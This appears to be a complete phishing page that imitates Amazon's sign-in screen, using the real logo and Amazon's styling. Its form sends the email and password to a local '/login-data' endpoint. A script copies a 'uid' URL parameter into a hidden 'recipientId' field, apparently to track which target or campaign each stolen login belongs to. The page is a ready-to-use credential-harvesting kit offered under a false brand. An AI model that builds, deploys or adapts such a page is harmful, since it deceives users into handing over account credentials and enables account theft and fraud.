<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Amazon Sign-In</title>
    <style>
        body, html { margin: 0; padding: 20px; font-family: "Amazon Ember", Arial, sans-serif; background: #fff; display: flex; justify-content: center; box-sizing: border-box; }
        .container { width: 100%; max-width: 400px; }
        .logo { width: 120px; margin: 0 auto 20px; display: block; }
        h1 { font-weight: 400; font-size: 28px; margin-bottom: 20px; }
        .form-box { border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; }
        label { font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px; }
        input { width: 100%; height: 44px; padding: 3px 12px; border: 1px solid #a6a6a6; border-radius: 4px; margin-bottom: 20px; box-sizing: border-box; font-size: 16px; }
        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
        button { width: 100%; height: 44px; background: linear-gradient(to bottom,#f7dfa5,#f0c14b); border-radius: 4px; border: 1px solid #a88734; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
        <div class="form-box">
            <h1>Sign in</h1>
            <form action="/login-data" method="post">
                <label for="username">Email or mobile phone number</label>
                <input type="text" id="username" name="username" required autocapitalize="none">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <input type="hidden" name="service" value="Amazon">
                <input type="hidden" id="recipientId" name="recipientId" value="">
                <button type="submit">Continue</button>
            </form>
        </div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
